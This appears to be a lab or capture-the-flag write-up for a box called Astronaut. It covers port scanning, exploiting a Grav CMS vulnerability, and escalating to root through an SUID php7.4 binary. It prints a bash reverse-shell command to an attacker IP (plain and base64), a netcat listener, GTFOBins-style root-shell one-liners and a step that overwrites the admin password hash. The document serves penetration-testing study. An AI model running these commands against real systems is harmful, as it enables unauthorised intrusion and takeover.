# Astronaut

## Enumeration & scanning

- Only two ports open: 22 & 80
- HTTP 80 seems to be running Grav CMS
- Has login pages for users and admin

``` sh
# Scan open ports
sudo nmap -p- -sV 192.168.148.12
# Find more details for open ports, find Grav CMS
nmap -p 22,80 -A 192.168.148.12  
# Scan webserver, find robots.txt
nuclei -target http://192.168.148.12/grav-admin/
# Scan subdirectories (no recursion and redirects), find user and admin login pages
feroxbuster -u http://192.168.148.12/grav-admin -n -r
```

## Foothold

- Look for Grav exploits that seem to match (no version information known)
- Find exploit for CVE-2021-47812 (unauthenticated)

## Exploitation

- Exploit CVE-2021-47812 with `49973.py`

``` sh
# Alter destination for exploit
# Alter payload for exploit
echo -ne "bash -i >& /dev/tcp/192.168.45.218/4444 0>&1" | base64 -w0 
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIxOC80NDQ0IDA+JjE=  
# Capture webshell (wait a min)
nc -nlvp 4444
python3 49973.py
# Get www-data user RCE
```

## Privilege Escalation

- Can't get to `/home/alex` (only need one flag for root but was unknown at the time)
- Find `php7.4` binary with SUID bit set
- Use GTFObins to discover how to abuse `php7.4` binary for elevating privileges. Didn't manage to get root shell but used read file method instead. However, in the end there was a command that worked for shell (best method).


``` sh
# Find SUID bits set
find / -perm -u=s -type f 2>/dev/null
# Get root flag
php7.4 -r 'readfile("/root/proof.txt");'
7451d428acf9d9260bc6e726ec8cb12e
# Get root flag (best method by upgrading shell)
php7.4 -r 'pcntl_exec("/bin/sh", ["-p"]);'
cat /root/proof.txt
```


## References

- https://www.exploit-db.com/exploits/49973
- https://gtfobins.org/gtfobins/php/
- https://hashcat.net/wiki/doku.php?id=example_hashes 
- https://bcrypt-generator.com/

## Rabbit holes

- Find `~/html/grav-admin/user/accounts/admin.yaml` file that contains bcrypt hash for admin user. Copy this file and alter hash using bcrypt generator. Can then login as admin user in Grav but doesn't add value since we already have RCE as `www-data` user.

``` sh
# copy admin file
cp admin.yaml admin2.yaml
# remove last line with hash
sed -i '$ d' admin.yaml
# add new line with hash from https://bcrypt-generator.com/
echo 'hashed_password: $2a$10$9FQRpIVWzZEQXKMgjMklbudCwhMOOTKgxLxiS8sYCJFxBk35jAMWC' >> admin.yaml
# login with admin:password in admin portal
```
